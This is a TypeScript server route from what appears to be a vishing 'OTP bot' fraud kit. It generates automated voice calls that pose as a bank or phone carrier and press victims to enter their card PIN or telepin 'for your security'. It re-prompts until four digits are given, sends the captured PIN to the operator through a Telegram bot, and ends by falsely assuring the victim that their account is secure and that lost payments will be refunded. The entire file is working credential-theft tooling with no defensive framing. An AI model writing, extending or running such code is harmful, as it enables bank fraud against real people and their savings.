import { bot } from '../..';
import { app } from '../';
import { v4 as uuidv4 } from 'uuid';

app.post('/calls/pin/:chatId/:language', async (req, res) => {
  const { chatId, language } = req.params;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  const { pinType } = req.query;

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `call PIN STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `You have not entered anything. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
                : `You have not entered anything. For your security and to protect your account. enter your ${pinType} followed by the pound key`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
          },
        },
      ],
    });
  }

  if (dtmf) {
    if (dtmf.length !== 4) {
      return res.json({
        id: uuidv4(),
        title: `call PIN STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The ${
                language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
              } you have entered is incorrect. To AUTHENTICATE YOU please enter your ${
                language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
              }, the same pin you use at the ATM, followed by the pound key.`,
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
            },
          },
        ],
      });
    }

    await bot.telegram.sendMessage(
      req.params.chatId,
      req.params.language === 'en-US'
        ? `Card Pin is <b>${dtmf}</b> 💳`
        : `Telepin is <b>${dtmf}</b> 📟`,
      {
        parse_mode: 'HTML',
      },
    );
  }

  return res.json({
    id: uuidv4(),
    title: `call bank - ${chatId} no OTP`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload: `GREAT, you have entered ${dtmf
            .split('')
            .join(
              ', ',
            )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
          language,
          voice: 'female',
        },
      },
    ],
  });
});
